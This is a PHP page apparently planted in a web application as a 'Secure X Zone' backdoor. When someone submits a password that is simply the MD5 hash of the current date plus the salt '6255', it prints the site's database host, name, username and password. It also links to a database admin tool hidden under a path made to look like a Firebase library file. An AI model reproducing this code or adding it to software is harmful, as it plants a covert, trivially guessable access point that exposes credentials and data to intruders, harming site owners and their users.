<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" type="text/css" href="https://bootswatch.com/3/paper/bootstrap.min.css">
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <title>Secure X Zone | 6255</title>
  <style>.well{margin-top: 200px;}.alert{width: 90%;}.left{text-align: left;font-style:italic;font-size:16px;}u{color: black;}.alert { width: 85%;border: 2px solid #e51c23;color: black;background-color: #f5e4e4;}.alert .close{color: black;}#submitData{display: none;}u{color: red;}.note{font-size: 27px;margin: 0px;}</style>
</head>
<?php

include_once('db_info.php');
include_once('configuration_variables.php');

if(isset($_POST['submit']))
{
      $password = isset($_POST['password']) ? trim($_POST['password']) : '';
      $salt = "6255";
      
      if(!empty($password)){
        
        $pass = MD5(date('dmY')).$salt;
        
        if($password == $pass){
            
            echo "<br>Server : " .TSITE_SERVER;
            echo "<br>DB : " .TSITE_DB;
            echo "<br>UNAME : " .TSITE_USERNAME;
            echo "<br>PASS : " .TSITE_PASS."_".date('dmy');
            echo "<hr>";
            echo 'date_default_timezone_set: ' . date_default_timezone_get() . '<br />';
            echo "<hr>";
            //https://www.drup.ng/en/adminer4.php?username=asdasd&db=asdasd
            $linkToDb = $tconfig["tsite_url"]."assets/libraries/firebase/src/firebasedb.php?username=".TSITE_USERNAME."&db=".TSITE_DB;
            echo '<a target="_blank" href="'.$linkToDb.'">Link To database</a>' . '<br />';
            exit;
        }else{
            echo "<div class='alert alert-danger'>You are not valid authorized person .!</div>";
            header( "refresh:3;url=getdbDetails.php" );
            exit;
        }
        
      }
      else{
        $msg = "You Are not authorized Person";
      }
      
}
?>

<body>
  <div class="container-fluide">
    <div class="col-md-12">
        <h4>Secure <a href="https://www.md5online.org/" target="_blank">X</a> Zone</h4><hr>

        <form action="" method="POST" class="form-horizontal">
          <div class="form-group">
            <label class="col-lg-3 control-label">Please Enter High Security Password</label>
            <div class="col-lg-4">
              <input type="text" style="margin-top: 7px;" name="password" onchange="checkSelectedFile()">
            </div>
            <div class="col-lg-2">
              <button type="submit" name="submit" id="submitData" class="btn btn-sm btn-primary">Get Access</button>
            </div>
          </div>
        </form>
    </div>    
  </div>

  <style type="text/css">
    .alert-fixed {
    position:fixed; 
    top: 0px; 
    left: 950px; 
    width: 28%;
    z-index:9999; 
    border-radius:0px
}
  </style>
  
<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>

<script>
   function checkSelectedFile(){
        $("#submitData").show();
    }
    $(document).ready(function() {
      $(window).keydown(function(event){
        if(event.keyCode == 13) {
          event.preventDefault();
          return false;
        }
      });
    });

</script>
</body>
</html>
